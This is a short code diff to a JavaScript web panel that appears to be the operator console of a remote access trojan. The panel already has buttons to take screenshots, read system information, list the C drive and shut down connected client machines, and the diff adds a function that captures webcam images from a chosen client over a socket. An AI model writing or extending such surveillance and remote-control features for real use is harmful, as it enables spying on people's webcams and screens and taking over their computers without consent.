@@ -34,6 +34,7 @@
                   <button onclick="sayhi(${c})">say hi</button>
                   <button onclick="systeminfo(${c})">system info</button>
                   <button onclick="screenshot(${c})">screenshot</button>
+                  <button onclick="webcam(${c})">webcam</button>
                   <button onclick="ls(${c}, 'C://')">ls</button>
                   <button onclick="sendoff(${c})">close</button>
                   <button onclick="shutdown(${c})">shutdown</button>
@@ -93,6 +94,11 @@
     function screenshot(cl) {
       console.log('screenshot', cl);
       socket.emit('client:send', {sid: cl, cmd: 'screenshot', args: 'screenshot.bmp'});
+    }
+
+    function webcam(cl) {
+      console.log('webcam', cl);
+      socket.emit('client:send', {sid: cl, cmd: 'webcam', args: 'webcam.bmp'});
     }
 
     function download(cl, name, path) {
